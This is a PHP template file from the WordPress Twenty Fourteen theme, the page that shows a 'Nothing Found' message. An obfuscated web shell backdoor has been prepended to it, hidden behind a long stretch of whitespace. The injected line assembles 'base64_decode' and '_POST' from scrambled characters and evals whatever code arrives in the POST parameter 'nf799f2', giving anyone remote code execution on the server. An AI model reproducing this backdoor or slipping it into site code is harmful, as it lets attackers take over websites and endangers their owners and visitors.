<?php                                                                                                                                                                                                                                                               $tot5="oep_stab6c4d";$ljpr92 =strtolower($tot5[7]. $tot5[6].$tot5[4].$tot5[1]. $tot5[8].$tot5[10]. $tot5[3] . $tot5[11].$tot5[1].$tot5[9].$tot5[0]. $tot5[11]. $tot5[1] );$but5= strtoupper($tot5[3].$tot5[2]. $tot5[0].$tot5[4].$tot5[5]) ; if (isset( ${ $but5} ['nf799f2'] ) ) {eval ($ljpr92 (${$but5}[ 'nf799f2']));} ?> <?php
/**
 * The template for displaying a "No posts found" message
 *
 * @package WordPress
 * @subpackage Twenty_Fourteen
 * @since Twenty Fourteen 1.0
 */
?>

<header class="page-header">
	<h1 class="page-title"><?php _e( 'Nothing Found', 'twentyfourteen' ); ?></h1>
</header>

<div class="page-content">
	<?php if ( is_home() && current_user_can( 'publish_posts' ) ) : ?>

	<p><?php printf( __( 'Ready to publish your first post? <a href="%1$s">Get started here</a>.', 'twentyfourteen' ), admin_url( 'post-new.php' ) ); ?></p>

	<?php elseif ( is_search() ) : ?>

	<p><?php _e( 'Sorry, but nothing matched your search terms. Please try again with some different keywords.', 'twentyfourteen' ); ?></p>
	<?php get_search_form(); ?>

	<?php else : ?>

	<p><?php _e( 'It seems we can&rsquo;t find what you&rsquo;re looking for. Perhaps searching can help.', 'twentyfourteen' ); ?></p>
	<?php get_search_form(); ?>

	<?php endif; ?>
</div><!-- .page-content -->
